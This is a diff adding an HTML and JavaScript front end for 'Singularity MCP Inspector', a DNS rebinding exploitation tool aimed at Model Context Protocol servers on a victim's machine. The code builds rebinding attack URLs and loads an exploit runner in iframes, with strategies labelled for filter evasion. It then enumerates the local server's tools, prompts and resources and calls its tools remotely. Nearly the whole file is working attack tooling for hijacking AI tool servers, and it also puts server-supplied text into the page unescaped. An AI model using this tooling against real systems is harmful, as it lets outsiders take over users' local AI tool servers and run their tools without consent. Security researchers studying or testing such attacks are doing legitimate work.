@@ -1,0 +1,941 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <title>Singularity MCP Inspector - DNS Rebinding MCP Exploitation</title>
+    <script src="manager.js"></script>
+    <meta charset="utf-8">
+    <meta http-equiv="x-dns-prefetch-control" content="off">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css"
+        integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">
+    <style>
+        .tab-content {
+            display: none;
+        }
+        .tab-content.active {
+            display: block;
+        }
+        .nav-tabs .nav-link.active {
+            background-color: #007bff;
+            color: white;
+        }
+        .capability-item {
+            margin-bottom: 15px;
+            padding: 10px;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+        }
+        .capability-header {
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        .tool-arg-input {
+            margin-bottom: 8px;
+        }
+        #logOutput {
+            height: 400px;
+            overflow-y: scroll;
+            background-color: #f8f9fa;
+            padding: 10px;
+            font-family: monospace;
+            font-size: 12px;
+            border: 1px solid #dee2e6;
+        }
+        .log-entry {
+            margin-bottom: 5px;
+            padding: 3px;
+        }
+        .log-success {
+            color: #28a745;
+        }
+        .log-error {
+            color: #dc3545;
+        }
+        .log-info {
+            color: #17a2b8;
+        }
+        .status-indicator {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 5px;
+        }
+        .status-disconnected {
+            background-color: #dc3545;
+        }
+        .status-connecting {
+            background-color: #ffc107;
+        }
+        .status-connected {
+            background-color: #28a745;
+        }
+        .json-display {
+            background-color: #f8f9fa;
+            padding: 10px;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 12px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container-fluid">
+        <h3>Singularity MCP Inspector</h3>
+        <small class="text-muted">
+            DNS Rebinding exploitation framework for Model Context Protocol (MCP) servers. 
+            This tool allows you to test MCP servers for DNS rebinding vulnerabilities and demonstrate impact.
+            <a href="https://modelcontextprotocol.io/docs/tools/inspector" target="_blank">MCP Inspector Docs</a>
+        </small>
+
+        <!-- Connection Status -->
+        <div class="mt-3 mb-3">
+            <h5>
+                <span id="statusIndicator" class="status-indicator status-disconnected"></span>
+                Status: <span id="connectionStatus">Disconnected</span>
+            </h5>
+        </div>
+
+        <form action="javascript:void(0);">
+            <!-- DNS Rebinding Configuration -->
+            <div class="card mb-3">
+                <div class="card-header">
+                    <h5>DNS Rebinding Configuration</h5>
+                </div>
+                <div class="card-body">
+                    <div class="form-group row">
+                        <div class="col-3">
+                            <label for="attackhostdomain">Attack Host Domain</label>
+                        </div>
+                        <div class="col-5">
+                            <input id="attackhostdomain" class="form-control" 
+                                placeholder="e.g. dynamic.attacker.com" value="" spellcheck="false" />
+                        </div>
+                    </div>
+                    <div class="form-group row">
+                        <div class="col-2">
+                            <label for="attackhostipaddress">Attack Host</label>
+                        </div>
+                        <div class="col-4">
+                            <input id="attackhostipaddress" class="form-control" 
+                                placeholder="xxx.xxx.xxx.xxx" value="" spellcheck="false" />
+                        </div>
+                        <div class="col-2">
+                            <label for="targethostipaddress">Target Host</label>
+                        </div>
+                        <div class="col-4">
+                            <input id="targethostipaddress" class="form-control" 
+                                value="127.0.0.1" spellcheck="false" 
+                                data-toggle="tooltip" data-placement="top" 
+                                title="IP address, hostname, or FQDN" />
+                        </div>
+                    </div>
+                    <div class="form-group row">
+                        <div class="col-2">
+                            <label for="targetport">Target Port</label>
+                        </div>
+                        <div class="col-2">
+                            <input id="targetport" class="form-control" 
+                                placeholder="e.g. 8080" value="8080" />
+                        </div>
+                        <div class="col-2">
+                            <input onclick="requestPort()" id="requestport" 
+                                type="submit" value="Request New Port" disabled>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="col-12">
+                            <small id="targetportHelp" class="form-text text-muted">
+                                Attack server listening on: <span id="listenports">unknown</span>
+                            </small>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- MCP Connection Configuration -->
+            <div class="card mb-3">
+                <div class="card-header">
+                    <h5>MCP Connection Configuration</h5>
+                </div>
+                <div class="card-body">
+                    <div class="form-group row">
+                        <div class="col-2">
+                            <label for="mcpTransport">Transport</label>
+                        </div>
+                        <div class="col-3">
+                            <select id="mcpTransport" class="form-control" onchange="mcpInspector.updateEndpointField()">
+                                <option value="auto">Auto-detect</option>
+                                <option value="http">HTTP (Streamable)</option>
+                                <option value="sse">SSE</option>
+                            </select>
+                        </div>
+                        <div class="col-2">
+                            <label for="mcpEndpoint">Endpoint</label>
+                        </div>
+                        <div class="col-4">
+                            <input id="mcpEndpoint" class="form-control" 
+                                placeholder="Auto: tries /mcp, /sse, etc." value="" spellcheck="false" disabled />
+                        </div>
+                    </div>
+                    <div class="form-group row">
+                        <div class="col-12">
+                            <small id="mcpEndpointHelp" class="form-text text-muted">
+                                Auto-detect will try common endpoints: /mcp, /mcp/, /sse, /sse/, /api/mcp, /api/sse. 
+                                Select a specific transport to manually specify an endpoint.
+                            </small>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Action Buttons -->
+            <div class="form-group row">
+                <div class="col-3">
+                    <button onclick="mcpInspector.startAttack()" id="startAttack" 
+                        type="button" class="btn btn-primary" autofocus>Start DNS Rebinding Attack</button>
+                </div>
+                <div class="col-3">
+                    <button onclick="mcpInspector.detectEndpoint()" id="detectEndpoint" 
+                        type="button" class="btn btn-info" disabled>Detect MCP Endpoint</button>
+                </div>
+                <div class="col-3">
+                    <button onclick="mcpInspector.initializeMcp()" id="initializeMcp" 
+                        type="button" class="btn btn-success" disabled>Initialize MCP Session</button>
+                </div>
+                <div class="col-3">
+                    <button onclick="toggle()" type="button" class="btn btn-secondary">
+                        Toggle Advanced Options</button>
+                </div>
+            </div>
+
+            <!-- Advanced Options -->
+            <div id="advanced" class="d-none">
+                <div class="card mb-3">
+                    <div class="card-header">
+                        <h5>Advanced DNS Rebinding Options</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="form-group row">
+                            <div class="col-2">
+                                <label for="rebindingStrategy">Rebinding Strategy</label>
+                            </div>
+                            <div class="col-3">
+                                <select id="rebindingStrategy" class="rebindingstrategy-dropdown-content">
+                                    <option id="fs" value="fs" title="Default, conservative">First then second</option>
+                                    <option id="ma" value="ma" title="Fast">Multiple answers</option>
+                                    <option id="rr" value="rr" title="IPS/filters evasion">Round robin</option>
+                                    <option id="rd" value="rd" title="IPS/filters evasion">Random</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="form-group row">
+                            <div class="col-2">
+                                <label for="interval">Interval (seconds)</label>
+                            </div>
+                            <div class="col-2">
+                                <input id="interval" class="form-control" value="20" />
+                            </div>
+                        </div>
+                        <div class="form-group row">
+                            <div class="col-2">
+                                <label for="flushdns">Flood DNS Cache</label>
+                            </div>
+                            <div class="col-1">
+                                <input id="flushdns" type="checkbox" value="" />
+                            </div>
+                        </div>
+                        <div class="form-group row">
+                            <div class="col-2">
+                                <label for="indextoken">Index Token</label>
+                            </div>
+                            <div class="col-3">
+                                <input id="indextoken" class="form-control" 
+                                    value="thisismytesttoken" spellcheck="false" />
+                            </div>
+                        </div>
+                        <div class="form-group row">
+                            <div class="col-2">
+                                <label for="wsproxyport">WS/Proxy Port</label>
+                            </div>
+                            <div class="col-2">
+                                <input id="wsproxyport" class="form-control" value="3129" />
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </form>
+
+        <!-- Tabs for MCP Features -->
+        <ul class="nav nav-tabs mt-4" id="mcpTabs">
+            <li class="nav-item">
+                <a class="nav-link active" href="#" onclick="mcpInspector.showTab('capabilities'); return false;">
+                    Capabilities</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="#" onclick="mcpInspector.showTab('tools'); return false;">
+                    Tools</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="#" onclick="mcpInspector.showTab('prompts'); return false;">
+                    Prompts</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="#" onclick="mcpInspector.showTab('resources'); return false;">
+                    Resources</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="#" onclick="mcpInspector.showTab('logs'); return false;">
+                    Logs</a>
+            </li>
+        </ul>
+
+        <!-- Tab Content -->
+        <div class="mt-3">
+            <!-- Capabilities Tab -->
+            <div id="capabilitiesTab" class="tab-content active">
+                <div class="card">
+                    <div class="card-header">
+                        <h5>MCP Server Capabilities</h5>
+                    </div>
+                    <div class="card-body">
+                        <button onclick="mcpInspector.discoverCapabilities()" id="discoverCapabilities" 
+                            class="btn btn-primary mb-3" disabled>Discover Capabilities</button>
+                        <div id="capabilitiesContent">
+                            <p class="text-muted">Initialize MCP session to discover capabilities.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Tools Tab -->
+            <div id="toolsTab" class="tab-content">
+                <div class="card">
+                    <div class="card-header">
+                        <h5>MCP Tools</h5>
+                    </div>
+                    <div class="card-body">
+                        <button onclick="mcpInspector.listTools()" id="listTools" 
+                            class="btn btn-primary mb-3" disabled>List Tools</button>
+                        <div id="toolResults"></div>
+                        <div id="toolsContent">
+                            <p class="text-muted">Initialize MCP session to list tools.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Prompts Tab -->
+            <div id="promptsTab" class="tab-content">
+                <div class="card">
+                    <div class="card-header">
+                        <h5>MCP Prompts</h5>
+                    </div>
+                    <div class="card-body">
+                        <button onclick="mcpInspector.listPrompts()" id="listPrompts" 
+                            class="btn btn-primary mb-3" disabled>List Prompts</button>
+                        <div id="promptResults"></div>
+                        <div id="promptsContent">
+                            <p class="text-muted">Initialize MCP session to list prompts.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Resources Tab -->
+            <div id="resourcesTab" class="tab-content">
+                <div class="card">
+                    <div class="card-header">
+                        <h5>MCP Resources</h5>
+                    </div>
+                    <div class="card-body">
+                        <button onclick="mcpInspector.listResources()" id="listResources" 
+                            class="btn btn-primary mb-3" disabled>List Resources</button>
+                        <div id="resourcesContent">
+                            <p class="text-muted">Initialize MCP session to list resources.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Logs Tab -->
+            <div id="logsTab" class="tab-content">
+                <div class="card">
+                    <div class="card-header">
+                        <h5>Activity Logs</h5>
+                        <button onclick="mcpInspector.clearLogs()" class="btn btn-sm btn-secondary float-right">
+                            Clear Logs</button>
+                    </div>
+                    <div class="card-body">
+                        <div id="logOutput"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Attack Frame Container -->
+        <div id="message" class="d-none mt-3">
+            Please wait for DNS cache entries to expire and rebinding to complete...
+        </div>
+        <div id="attackframes"></div>
+    </div>
+
+    <script>
+        // MCP Inspector Application
+        const mcpInspector = {
+            app: null,
+            attackFrame: null,
+            mcpInitialized: false,
+            currentTab: 'capabilities',
+
+            init() {
+                // Initialize the base Singularity app
+                this.app = App();
+                this.app.init(this.onRebindingSuccess.bind(this));
+
+                // Listen for messages from MCP exploit runner
+                window.addEventListener('message', this.handleMcpMessage.bind(this), false);
+
+                // Load configuration
+                this.app.getConfiguration().getManagerConfiguration().then(() => {
+                    this.populateConfig();
+                });
+
+                // Get HTTP server config
+                getHTTPServersConfig().then((config) => {
+                    document.getElementById('listenports').textContent = config.ports;
+                    document.getElementById('targetport').value = config.ports[config.ports.length - 1];
+                    document.getElementById('requestport').disabled = !config.AllowDynamicHTTPServers;
+                });
+                
+                // Initialize endpoint field state
+                this.updateEndpointField();
+            },
+
+            updateEndpointField() {
+                const transport = document.getElementById('mcpTransport').value;
+                const endpointField = document.getElementById('mcpEndpoint');
+                const helpText = document.getElementById('mcpEndpointHelp');
+                
+                if (transport === 'auto') {
+                    // Auto-detect: disable endpoint field
+                    endpointField.disabled = true;
+                    endpointField.value = '';
+                    endpointField.placeholder = 'Auto: tries /mcp, /sse, etc.';
+                    helpText.textContent = 'Auto-detect will try common endpoints: /mcp, /mcp/, /sse, /sse/, /api/mcp, /api/sse. Select a specific transport to manually specify an endpoint.';
+                } else {
+                    // Specific transport: enable endpoint field
+                    endpointField.disabled = false;
+                    endpointField.placeholder = transport === 'http' ? 'e.g., /mcp or /api/mcp' : 'e.g., /sse or /api/sse';
+                    if (!endpointField.value) {
+                        endpointField.value = transport === 'http' ? '/mcp' : '/sse';
+                    }
+                    helpText.textContent = `Specify the exact endpoint for ${transport.toUpperCase()} transport. The endpoint will be tested with this transport only.`;
+                }
+            },
+
+            populateConfig() {
+                const config = this.app.getConfiguration();
+                document.getElementById('attackhostdomain').value = config.getAttackHostDomain();
+                document.getElementById('attackhostipaddress').value = config.getAttackHostIPAddress();
+                document.getElementById('targethostipaddress').value = config.getTargetHostIPAddress();
+                document.getElementById('indextoken').value = config.getIndexToken();
+                document.getElementById('interval').value = config.getInterval();
+                document.getElementById('wsproxyport').value = config.getWsProxyPort();
+                document.getElementById(config.getRebindingStrategy()).selected = true;
+                document.getElementById('flushdns').checked = config.getFlushDns();
+            },
+
+            startAttack() {
+                this.log('Starting DNS rebinding attack...', 'info');
+                
+                // Set payload to MCP exploit runner
+                const config = this.app.getConfiguration();
+                config.setAttackPayload('mcp-exploit-runner.js');
+                
+                // Update configuration from UI
+                const interval = document.getElementById('interval').value;
+                config.setInterval(interval);
+                config.setFlushDns(document.getElementById('flushdns').checked);
+                config.setWsProxyPort(document.getElementById('wsproxyport').value);
+                config.setAttackMethod('fetch'); // Use fetch method to avoid CSP issues
+                
+                // Manually construct attack URL (similar to manager.js begin())
+                const fm = this.app.getFrameManager();
+                const hosturl = "http://s-%1.%2-%3-%4-e.%5:%6/%7";
+                
+                // Helper function from manager.js
+                function ipToHexOrOriginal(input) {
+                    const parts = input.split('.');
+                    if (parts.length !== 4) return input;
+                    const bytes = new Uint8Array(4);
+                    for (let i = 0; i < 4; i++) {
+                        const num = Number(parts[i]);
+                        if (!Number.isInteger(num) || num < 0 || num > 255) return input;
+                        bytes[i] = num;
+                    }
+                    return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
+                }
+                
+                const attackUrl = hosturl
+                    .replace("%1", ipToHexOrOriginal(document.getElementById('attackhostipaddress').value))
+                    .replace("%2", ipToHexOrOriginal(document.getElementById('targethostipaddress').value))
+                    .replace("%3", Math.floor(Math.random() * 2 ** 32))
+                    .replace("%4", document.getElementById('rebindingStrategy').value)
+                    .replace("%5", document.getElementById('attackhostdomain').value)
+                    .replace("%6", document.getElementById('targetport').value)
+                    .replace("%7", 'soopayload.html') + '?rnd=' + Math.random();
+                
+                const fid = fm.addFrame(attackUrl);
+                this.app.addFrameToDOM(fm.frame(fid));
+                
+                document.getElementById('message').className = 'd-block';
+                document.getElementById('startAttack').disabled = true;
+                
+                // Start reloading the frame at intervals
+                fm.frame(fid).setTimer(setInterval(() => {
+                    this.app.reloadAttackFrame(fm.frame(fid));
+                }, parseInt(interval) * 1000));
+                
+                this.updateStatus('connecting', 'DNS Rebinding in Progress');
+            },
+
+            onRebindingSuccess(msg) {
+                this.log('DNS Rebinding successful! Connected to target.', 'success');
+                this.updateStatus('connected', 'Rebinding Complete');
+                
+                // Enable MCP detection button
+                document.getElementById('detectEndpoint').disabled = false;
+                document.getElementById('startAttack').disabled = true;
+                
+                // Store reference to attack frame
+                this.attackFrame = msg.source;
+                
+                // Auto-detect MCP endpoint
+                setTimeout(() => {
+                    this.detectEndpoint();
+                }, 500);
+            },
+
+            detectEndpoint() {
+                const transport = document.getElementById('mcpTransport').value;
+                const endpoint = document.getElementById('mcpEndpoint').value;
+                
+                if (transport === 'auto') {
+                    this.log('Auto-detecting MCP endpoint and transport...', 'info');
+                } else {
+                    this.log(`Detecting MCP endpoint: ${endpoint} (${transport})`, 'info');
+                }
+                
+                this.sendToFrame({
+                    cmd: 'detectMcp',
+                    endpoint: endpoint || '',  // Empty string for auto-detect
+                    transport: transport
+                });
+            },
+
+            initializeMcp() {
+                this.log('Initializing MCP session...', 'info');
+                this.sendToFrame({ cmd: 'initializeMcp' });
+            },
+
+            discoverCapabilities() {
+                this.log('Discovering MCP capabilities...', 'info');
+                this.sendToFrame({ cmd: 'discoverCapabilities' });
+            },
+
+            listTools() {
+                this.log('Listing MCP tools...', 'info');
+                this.sendToFrame({ cmd: 'listTools' });
+            },
+
+            listPrompts() {
+                this.log('Listing MCP prompts...', 'info');
+                this.sendToFrame({ cmd: 'listPrompts' });
+            },
+
+            listResources() {
+                this.log('Listing MCP resources...', 'info');
+                this.sendToFrame({ cmd: 'listResources' });
+            },
+
+            callTool(toolName, args) {
+                this.log(`Calling tool: ${toolName}`, 'info');
+                this.sendToFrame({
+                    cmd: 'callTool',
+                    toolName: toolName,
+                    args: args
+                });
+            },
+
+            sendToFrame(message) {
+                if (this.attackFrame) {
+                    this.attackFrame.postMessage(message, '*');
+                } else {
+                    this.log('Error: No attack frame available', 'error');
+                }
+            },
+
+            handleMcpMessage(event) {
+                const data = event.data;
+                
+                if (!data || !data.type || !data.type.startsWith('mcp-')) {
+                    return; // Not an MCP message
+                }
+
+                switch (data.type) {
+                    case 'mcp-log':
+                        this.log(data.message, data.level || 'info');
+                        break;
+                    
+                    case 'mcp-endpoint-detected':
+                        this.onEndpointDetected(data);
+                        break;
+                    
+                    case 'mcp-initialized':
+                        this.onMcpInitialized(data);
+                        break;
+                    
+                    case 'mcp-capabilities':
+                        this.displayCapabilities(data.capabilities);
+                        break;
+                    
+                    case 'mcp-tools':
+                        this.displayTools(data.tools);
+                        break;
+                    
+                    case 'mcp-prompts':
+                        this.displayPrompts(data.prompts);
+                        break;
+                    
+                    case 'mcp-resources':
+                        this.displayResources(data.resources);
+                        break;
+                    
+                    case 'mcp-tool-result':
+                        this.displayToolResult(data);
+                        break;
+                    
+                    case 'mcp-prompt-result':
+                        this.displayPromptResult(data);
+                        break;
+                }
+            },
+
+            onEndpointDetected(data) {
+                if (data.success) {
+                    this.log(`MCP endpoint detected: ${data.endpoint} (${data.transport})`, 'success');
+                    document.getElementById('mcpEndpoint').value = data.endpoint;
+                    document.getElementById('mcpTransport').value = data.transport;
+                    document.getElementById('initializeMcp').disabled = false;
+                } else {
+                    this.log('MCP endpoint not detected. Try different endpoint or transport.', 'error');
+                }
+            },
+
+            onMcpInitialized(data) {
+                if (data.success) {
+                    this.log('MCP session initialized successfully!', 'success');
+                    this.mcpInitialized = true;
+                    
+                    // Enable all MCP operation buttons
+                    document.getElementById('discoverCapabilities').disabled = false;
+                    document.getElementById('listTools').disabled = false;
+                    document.getElementById('listPrompts').disabled = false;
+                    document.getElementById('listResources').disabled = false;
+                    
+                    // Display server info
+                    if (data.serverInfo) {
+                        this.log(`Server: ${data.serverInfo.name || 'Unknown'} v${data.serverInfo.version || '?'}`, 'info');
+                    }
+                } else {
+                    this.log(`MCP initialization failed: ${data.error}`, 'error');
+                }
+            },
+
+            displayCapabilities(capabilities) {
+                const content = document.getElementById('capabilitiesContent');
+                let html = '<h6>Server Capabilities:</h6>';
+                
+                for (const [method, result] of Object.entries(capabilities)) {
+                    const hasData = result && !result.error;
+                    const statusClass = hasData ? 'text-success' : 'text-muted';
+                    
+                    html += `<div class="capability-item">
+                        <div class="capability-header ${statusClass}">${method}</div>
+                        <div class="json-display">${JSON.stringify(result, null, 2)}</div>
+                    </div>`;
+                }
+                
+                content.innerHTML = html;
+            },
+
+            displayTools(tools) {
+                const content = document.getElementById('toolsContent');
+                
+                if (!tools || tools.length === 0) {
+                    content.innerHTML = '<p class="text-muted">No tools available</p>';
+                    return;
+                }
+                
+                let html = '';
+                for (const tool of tools) {
+                    html += `<div class="capability-item">
+                        <div class="capability-header">${tool.name}</div>
+                        <p>${tool.description || 'No description'}</p>`;
+                    
+                    // Create form for tool arguments
+                    html += `<form onsubmit="mcpInspector.submitTool('${tool.name}', event); return false;">`;
+                    
+                    if (tool.inputSchema && tool.inputSchema.properties) {
+                        html += '<div class="mt-2"><strong>Arguments:</strong></div>';
+                        for (const [argName, argSchema] of Object.entries(tool.inputSchema.properties)) {
+                            const required = tool.inputSchema.required?.includes(argName) ? ' *' : '';
+                            html += `<div class="tool-arg-input">
+                                <label>${argName}${required}:</label>
+                                <input type="text" class="form-control form-control-sm" 
+                                    name="${argName}" placeholder="${argSchema.description || ''}" />
+                                <small class="text-muted">${argSchema.type || 'any'}</small>
+                            </div>`;
+                        }
+                    }
+                    
+                    html += `<button type="submit" class="btn btn-sm btn-primary mt-2">Execute Tool</button>
+                        </form>
+                    </div>`;
+                }
+                
+                content.innerHTML = html;
+            },
+
+            submitTool(toolName, event) {
+                event.preventDefault();  // Prevent form reset
+                event.stopPropagation();  // Stop event bubbling
+                
+                const form = event.target;
+                const args = {};
+                
+                // Collect form data
+                for (const element of form.elements) {
+                    if (element.name && element.value) {
+                        // Try to parse as JSON, otherwise use as string
+                        try {
+                            args[element.name] = JSON.parse(element.value);
+                        } catch (e) {
+                            args[element.name] = element.value;
+                        }
+                    }
+                }
+                
+                this.callTool(toolName, args);
+                
+                // Don't reset the form - keep values for easy re-execution
+                return false;
+            },
+
+            displayPrompts(prompts) {
+                const content = document.getElementById('promptsContent');
+                
+                if (!prompts || prompts.length === 0) {
+                    content.innerHTML = '<p class="text-muted">No prompts available</p>';
+                    return;
+                }
+                
+                let html = '';
+                for (const prompt of prompts) {
+                    html += `<div class="capability-item">
+                        <div class="capability-header">${prompt.name}</div>
+                        <p>${prompt.description || 'No description'}</p>`;
+                    
+                    // Create form for prompt arguments
+                    html += `<form onsubmit="mcpInspector.submitPrompt('${prompt.name}', event); return false;">`;
+                    
+                    if (prompt.arguments && prompt.arguments.length > 0) {
+                        html += '<div class="mt-2"><strong>Arguments:</strong></div>';
+                        for (const arg of prompt.arguments) {
+                            const required = arg.required ? ' *' : '';
+                            html += `<div class="tool-arg-input">
+                                <label>${arg.name}${required}:</label>
+                                <input type="text" class="form-control form-control-sm" 
+                                    name="${arg.name}" placeholder="${arg.description || ''}" 
+                                    ${arg.required ? 'required' : ''} />
+                            </div>`;
+                        }
+                    }
+                    
+                    html += `<button type="submit" class="btn btn-sm btn-primary mt-2">Get Prompt</button>
+                        </form>
+                    </div>`;
+                }
+                
+                content.innerHTML = html;
+            },
+
+            submitPrompt(promptName, event) {
+                event.preventDefault();
+                event.stopPropagation();
+                
+                const form = event.target;
+                const args = {};
+                
+                // Collect form data
+                for (const element of form.elements) {
+                    if (element.name && element.value) {
+                        args[element.name] = element.value;
+                    }
+                }
+                
+                this.callPrompt(promptName, args);
+                
+                // Don't reset the form
+                return false;
+            },
+
+            callPrompt(promptName, args) {
+                this.log(`Getting prompt: ${promptName}`, 'info');
+                this.sendToFrame({
+                    cmd: 'callPrompt',
+                    promptName: promptName,
+                    args: args
+                });
+            },
+
+            displayPromptResult(data) {
+                this.log(`Prompt ${data.promptName} result received`, 'success');
+                
+                console.log('displayPromptResult received:', data);
+                
+                let resultHtml = `<div class="capability-item">
+                    <div class="capability-header">Prompt Result: ${data.promptName}</div>`;
+                
+                if (data.result && data.result.messages) {
+                    resultHtml += '<div class="mt-2"><strong>Messages:</strong></div>';
+                    for (const msg of data.result.messages) {
+                        resultHtml += `<div class="json-display mb-2">
+                            <strong>Role:</strong> ${msg.role}<br>
+                            <strong>Content:</strong><br>
+                            ${JSON.stringify(msg.content, null, 2)}
+                        </div>`;
+                    }
+                }
+                
+                resultHtml += `<div class="mt-2"><strong>Full Result:</strong></div>
+                    <div class="json-display">${JSON.stringify(data.result, null, 2)}</div>
+                </div>`;
+                
+                // Append to dedicated results container
+                if (this.currentTab === 'prompts') {
+                    const resultsContainer = document.getElementById('promptResults');
+                    resultsContainer.insertAdjacentHTML('afterbegin', resultHtml);
+                }
+                
+                this.log(JSON.stringify(data.result, null, 2), 'success');
+            },
+
+            displayResources(resources) {
+                const content = document.getElementById('resourcesContent');
+                
+                if (!resources || resources.length === 0) {
+                    content.innerHTML = '<p class="text-muted">No resources available</p>';
+                    return;
+                }
+                
+                let html = '';
+                for (const resource of resources) {
+                    html += `<div class="capability-item">
+                        <div class="capability-header">${resource.name || resource.uri}</div>
+                        <p><strong>URI:</strong> ${resource.uri}</p>
+                        <p><strong>Type:</strong> ${resource.mimeType || 'unknown'}</p>
+                        <p>${resource.description || ''}</p>
+                    </div>`;
+                }
+                
+                content.innerHTML = html;
+            },
+
+            displayToolResult(data) {
+                this.log(`Tool ${data.toolName} result received`, 'success');
+                
+                // Debug logging
+                console.log('displayToolResult received:', data);
+                console.log('data.result:', data.result);
+                console.log('data.fullResponse:', data.fullResponse);
+                
+                const resultHtml = `<div class="capability-item">
+                    <div class="capability-header">Tool Result: ${data.toolName}</div>
+                    <div class="json-display">${JSON.stringify(data.result, null, 2)}</div>
+                    ${data.fullResponse ? `<div class="mt-2"><strong>Full Response (debug):</strong></div>
+                    <div class="json-display">${JSON.stringify(data.fullResponse, null, 2)}</div>` : ''}
+                </div>`;
+                
+                // Append to dedicated results container (doesn't affect tool forms)
+                if (this.currentTab === 'tools') {
+                    const resultsContainer = document.getElementById('toolResults');
+                    // Prepend new result (most recent at top)
+                    resultsContainer.insertAdjacentHTML('afterbegin', resultHtml);
+                }
+                
+                this.log(JSON.stringify(data.result, null, 2), 'success');
+            },
+
+            showTab(tabName) {
+                // Hide all tabs
+                document.querySelectorAll('.tab-content').forEach(tab => {
+                    tab.classList.remove('active');
+                });
+                
+                // Remove active from all nav links
+                document.querySelectorAll('.nav-link').forEach(link => {
+                    link.classList.remove('active');
+                });
+                
+                // Show selected tab
+                document.getElementById(tabName + 'Tab').classList.add('active');
+                event.target.classList.add('active');
+                
+                this.currentTab = tabName;
+            },
+
+            updateStatus(status, message) {
+                const indicator = document.getElementById('statusIndicator');
+                const statusText = document.getElementById('connectionStatus');
+                
+                indicator.className = 'status-indicator status-' + status;
+                statusText.textContent = message;
+            },
+
+            log(message, level = 'info') {
+                const logOutput = document.getElementById('logOutput');
+                const timestamp = new Date().toLocaleTimeString();
+                const entry = document.createElement('div');
+                entry.className = `log-entry log-${level}`;
+                entry.textContent = `[${timestamp}] ${message}`;
+                
+                logOutput.appendChild(entry);
+                logOutput.scrollTop = logOutput.scrollHeight;
+                
+                console.log(`[MCP Inspector ${level.toUpperCase()}]`, message);
+            },
+
+            clearLogs() {
+                document.getElementById('logOutput').innerHTML = '';
+            }
+        };
+
+        // Initialize on page load
+        document.addEventListener('DOMContentLoaded', () => {
+            mcpInspector.init();
+        });
+    </script>
+</body>
+
+</html>
+
